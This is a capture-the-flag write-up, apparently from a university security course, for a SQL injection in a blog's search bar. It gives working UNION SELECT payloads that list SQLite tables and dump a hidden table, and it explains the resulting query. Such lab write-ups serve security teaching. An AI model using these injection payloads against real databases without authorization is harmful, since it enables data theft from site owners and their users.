# Challenge `Wow, it can't be more juicy than this!` writeup

- Vulnerability: SQL Injection
- Where: `http://mustard.stt.rnl.tecnico.ulisboa.pt:22261` search bar
- Impact: Allows an attacker to perform queries and access information in the database

## Steps to reproduce

1. In the search bar, write `' UNION SELECT null, tbl_name, sql FROM sqlite_master WHERE type = 'table';--`
2. This will display the names of all the tables in the database and the SQL text that describes them. There you can find a table named 'secret_blog_post', with columns 'id', 'title' and 'content'
3. In the search bar, write `' UNION SELECT id, title, content FROM secret_blog_post;--`
4. This will display the secret blogpost that is on that table, with title 'Reminder' and the flag in its content

__Note: If you try to search for  `'a`, you will be redirected to an error page where you can see the structure of the query: `SELECT id, title, content FROM blog_post WHERE title LIKE '%<your_search>%' OR content LIKE '%<your_search>%'`. Since the `--` symbol represents the start of a comment in SQLite, the rest of the query will be ignored, so if you search for `' UNION SELECT null, tbl_name, sql FROM sqlite_master WHERE type = 'table';--`, the performed query will be `SELECT id, title, content FROM blog_post WHERE title LIKE '%' UNION SELECT null, tbl_name, sql FROM sqlite_master WHERE type = 'table';--`, displaying all the blogposts in the 'blog_post' table and the names of all the tables in the database and the SQL text that describes them; and if you search for `' UNION SELECT id, title, content FROM secret_blog_post;--`, the performed query will be `SELECT id, title, content FROM blog_post WHERE title LIKE '%' UNION SELECT id, title, content FROM secret_blog_post;--`, displaying all the blogposts in the 'blog_post' and 'secret_blog_post' tables__

[(POC)](pocs/wow_it_cant_be_more_juicy_than_this_poc.py)
